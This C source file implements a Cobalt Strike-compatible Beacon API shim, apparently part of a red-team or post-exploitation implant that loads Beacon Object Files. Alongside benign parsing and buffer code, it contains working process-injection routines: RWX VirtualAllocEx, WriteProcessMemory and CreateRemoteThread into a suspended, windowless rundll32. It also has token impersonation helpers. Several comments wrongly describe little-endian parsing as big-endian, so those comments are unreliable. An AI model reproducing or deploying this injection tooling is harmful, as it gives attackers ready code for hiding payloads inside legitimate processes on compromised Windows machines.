/*
 * beacon_api.c - Cobalt Strike-compatible Beacon API shim
 *
 * BOF objects link against these symbols.  BeaconOutput() accumulates
 * data into g_bof_output which bof_execute() returns to the caller.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#include "beacon_api.h"

/* ---- Global BOF output buffer ---- */
uint8_t *g_bof_output     = NULL;
size_t   g_bof_output_len = 0;
size_t   g_bof_output_cap = 0;

/* -----------------------------------------------------------------------
 * Internal: grow g_bof_output by `need` bytes.
 * ---------------------------------------------------------------------- */
static int bof_output_grow(size_t need) {
    size_t required = g_bof_output_len + need;
    if (required <= g_bof_output_cap) return 1;

    size_t new_cap = g_bof_output_cap ? g_bof_output_cap : 256;
    while (new_cap < required) new_cap *= 2;

    uint8_t *nb;
    if (!g_bof_output) {
        nb = (uint8_t *)HeapAlloc(GetProcessHeap(), 0, new_cap);
    } else {
        nb = (uint8_t *)HeapReAlloc(GetProcessHeap(), 0, g_bof_output, new_cap);
    }
    if (!nb) return 0;
    g_bof_output     = nb;
    g_bof_output_cap = new_cap;
    return 1;
}

/* -----------------------------------------------------------------------
 * BeaconOutput - append data to the output accumulator
 * ---------------------------------------------------------------------- */
void BeaconOutput(int type, char *data, int len) {
    (void)type;
    if (!data || len <= 0) return;
    if (!bof_output_grow((size_t)len)) return;
    memcpy(g_bof_output + g_bof_output_len, data, (size_t)len);
    g_bof_output_len += (size_t)len;
}

/* -----------------------------------------------------------------------
 * BeaconPrintf - printf-style output
 * ---------------------------------------------------------------------- */
void BeaconPrintf(int type, char *fmt, ...) {
    char buf[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) BeaconOutput(type, buf, n);
}

/* -----------------------------------------------------------------------
 * BeaconDataParse - initialise parser over an existing buffer
 * ---------------------------------------------------------------------- */
void BeaconDataParse(datap *parser, char *buffer, int size) {
    if (!parser) return;
    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size;
    parser->size     = size;
}

/*
 * BeaconDataExtract - read a 4-byte big-endian length prefix then return
 * a pointer into the buffer.  *size is set to the field length.
 */
char *BeaconDataExtract(datap *parser, int *size) {
    if (!parser || parser->length < 4) return NULL;
    /* ax.bof_pack encodes lengths little-endian */
    uint32_t len = ((uint32_t)(uint8_t)parser->buffer[0])
                 | ((uint32_t)(uint8_t)parser->buffer[1] <<  8)
                 | ((uint32_t)(uint8_t)parser->buffer[2] << 16)
                 | ((uint32_t)(uint8_t)parser->buffer[3] << 24);
    parser->buffer += 4;
    parser->length -= 4;
    if ((int)len > parser->length) return NULL;
    char *result = parser->buffer;
    parser->buffer += len;
    parser->length -= (int)len;
    if (size) *size = (int)len;
    return result;
}

/*
 * BeaconDataInt - read a 4-byte big-endian integer
 */
int BeaconDataInt(datap *parser) {
    if (!parser || parser->length < 4) return 0;
    int val = (int)(((uint32_t)(uint8_t)parser->buffer[0])
                  | ((uint32_t)(uint8_t)parser->buffer[1] <<  8)
                  | ((uint32_t)(uint8_t)parser->buffer[2] << 16)
                  | ((uint32_t)(uint8_t)parser->buffer[3] << 24));
    parser->buffer += 4;
    parser->length -= 4;
    return val;
}

/*
 * BeaconDataShort - read a 2-byte big-endian short
 */
short BeaconDataShort(datap *parser) {
    if (!parser || parser->length < 2) return 0;
    short val = (short)(((uint16_t)(uint8_t)parser->buffer[0])
                       | ((uint16_t)(uint8_t)parser->buffer[1] << 8));
    parser->buffer += 2;
    parser->length -= 2;
    return val;
}

/*
 * BeaconDataLength - return remaining byte count
 */
int BeaconDataLength(datap *parser) {
    if (!parser) return 0;
    return parser->length;
}

/* -----------------------------------------------------------------------
 * Format buffer
 * ---------------------------------------------------------------------- */
void BeaconFormatAlloc(formatp *fmt, int maxsz) {
    if (!fmt) return;
    fmt->original = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)maxsz);
    fmt->buffer   = fmt->original;
    fmt->length   = 0;
    fmt->size     = maxsz;
}

void BeaconFormatReset(formatp *fmt) {
    if (!fmt || !fmt->original) return;
    fmt->buffer = fmt->original;
    fmt->length = 0;
}

void BeaconFormatFree(formatp *fmt) {
    if (!fmt) return;
    if (fmt->original) {
        HeapFree(GetProcessHeap(), 0, fmt->original);
        fmt->original = NULL;
        fmt->buffer   = NULL;
    }
    fmt->length = 0;
    fmt->size   = 0;
}

void BeaconFormatInt(formatp *fmt, int val) {
    if (!fmt || !fmt->original) return;
    /* Appends a 4-byte big-endian integer (Cobalt Strike format) */
    uint8_t buf[4];
    buf[0] = (uint8_t)((uint32_t)val >> 24);
    buf[1] = (uint8_t)((uint32_t)val >> 16);
    buf[2] = (uint8_t)((uint32_t)val >>  8);
    buf[3] = (uint8_t)((uint32_t)val);
    BeaconFormatAppend(fmt, (char *)buf, 4);
}

void BeaconFormatAppend(formatp *fmt, char *text, int len) {
    if (!fmt || !fmt->original || len <= 0) return;
    int remaining = fmt->size - fmt->length;
    if (len > remaining) len = remaining;
    memcpy(fmt->buffer, text, (size_t)len);
    fmt->buffer += len;
    fmt->length += len;
}

void BeaconFormatPrintf(formatp *fmt, char *format, ...) {
    if (!fmt || !fmt->original) return;
    int remaining = fmt->size - fmt->length;
    if (remaining <= 0) return;
    va_list ap;
    va_start(ap, format);
    int n = vsnprintf(fmt->buffer, (size_t)remaining, format, ap);
    va_end(ap);
    if (n > 0) {
        if (n > remaining) n = remaining;
        fmt->buffer += n;
        fmt->length += n;
    }
}

char *BeaconFormatToString(formatp *fmt, int *size) {
    if (!fmt) return NULL;
    if (size) *size = fmt->length;
    return fmt->original;
}

/* -----------------------------------------------------------------------
 * Token helpers
 * ---------------------------------------------------------------------- */
int BeaconIsAdmin(void) {
    BOOL is_admin = FALSE;
    PSID admin_sid = NULL;

    SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&nt_authority, 2,
                                   SECURITY_BUILTIN_DOMAIN_RID,
                                   DOMAIN_ALIAS_RID_ADMINS,
                                   0, 0, 0, 0, 0, 0, &admin_sid)) {
        return 0;
    }

    CheckTokenMembership(NULL, admin_sid, &is_admin);
    FreeSid(admin_sid);
    return is_admin ? 1 : 0;
}

BOOL BeaconUseToken(HANDLE token) {
    return ImpersonateLoggedOnUser(token);
}

void BeaconRevertToken(void) {
    RevertToSelf();
}

/* -----------------------------------------------------------------------
 * Process helpers
 * ---------------------------------------------------------------------- */
BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken,
                                 STARTUPINFO *si, PROCESS_INFORMATION *pi)
{
    char path[MAX_PATH];
    DWORD flags = CREATE_NO_WINDOW | CREATE_SUSPENDED;

    if (x86) {
        /* Try Wow64 sysdir for 32-bit host on 64-bit OS */
        GetSystemWow64DirectoryA(path, MAX_PATH);
        strncat(path, "\\rundll32.exe", MAX_PATH - strlen(path) - 1);
    } else {
        GetSystemDirectoryA(path, MAX_PATH);
        strncat(path, "\\rundll32.exe", MAX_PATH - strlen(path) - 1);
    }

    if (!ignoreToken) {
        /* Let impersonation token flow naturally */
    }

    return CreateProcessA(path, NULL, NULL, NULL, FALSE, flags, NULL, NULL, si, pi);
}

void BeaconInjectProcess(HANDLE hProc, int pid, char *payload, int p_len,
                         int p_offset, char *arg, int a_len)
{
    /* Basic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread injection */
    (void)pid;
    if (!hProc || !payload || p_len <= 0) return;

    LPVOID remote = VirtualAllocEx(hProc, NULL, (SIZE_T)p_len,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!remote) return;

    SIZE_T written;
    WriteProcessMemory(hProc, remote, payload, (SIZE_T)p_len, &written);

    if (a_len > 0 && arg) {
        /* Write args after payload */
        LPVOID arg_remote = VirtualAllocEx(hProc, NULL, (SIZE_T)a_len,
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_READWRITE);
        if (arg_remote) WriteProcessMemory(hProc, arg_remote, arg, (SIZE_T)a_len, &written);
    }

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)((uint8_t *)remote + p_offset),
        NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
}

void BeaconInjectTemporaryProcess(PROCESS_INFORMATION *pi, char *payload,
                                  int p_len, int p_offset,
                                  char *arg, int a_len)
{
    if (!pi) return;
    BeaconInjectProcess(pi->hProcess, (int)pi->dwProcessId,
                        payload, p_len, p_offset, arg, a_len);
    ResumeThread(pi->hThread);
}

void BeaconCleanupProcess(PROCESS_INFORMATION *pi) {
    if (!pi) return;
    if (pi->hProcess) {
        TerminateProcess(pi->hProcess, 0);
        CloseHandle(pi->hProcess);
        pi->hProcess = NULL;
    }
    if (pi->hThread) {
        CloseHandle(pi->hThread);
        pi->hThread = NULL;
    }
}

/* -----------------------------------------------------------------------
 * Key-value store (simple linear search, 64-entry limit)
 * ---------------------------------------------------------------------- */
#define KV_MAX 64
static struct { const char *key; void *ptr; } g_kv[KV_MAX];
static int g_kv_count = 0;

BOOL BeaconAddValue(const char *key, void *ptr) {
    if (!key) return FALSE;
    /* update existing */
    for (int i = 0; i < g_kv_count; i++) {
        if (g_kv[i].key && strcmp(g_kv[i].key, key) == 0) {
            g_kv[i].ptr = ptr;
            return TRUE;
        }
    }
    if (g_kv_count >= KV_MAX) return FALSE;
    g_kv[g_kv_count].key = key;
    g_kv[g_kv_count].ptr = ptr;
    g_kv_count++;
    return TRUE;
}

void *BeaconGetValue(const char *key) {
    if (!key) return NULL;
    for (int i = 0; i < g_kv_count; i++) {
        if (g_kv[i].key && strcmp(g_kv[i].key, key) == 0)
            return g_kv[i].ptr;
    }
    return NULL;
}

BOOL BeaconRemoveValue(const char *key) {
    if (!key) return FALSE;
    for (int i = 0; i < g_kv_count; i++) {
        if (g_kv[i].key && strcmp(g_kv[i].key, key) == 0) {
            g_kv[i] = g_kv[--g_kv_count];
            return TRUE;
        }
    }
    return FALSE;
}

BOOL toWideChar(char *src, wchar_t *dst, int max) {
    if (!src || !dst || max <= 0) return FALSE;
    int n = MultiByteToWideChar(CP_ACP, 0, src, -1, dst, max);
    return n > 0 ? TRUE : FALSE;
}
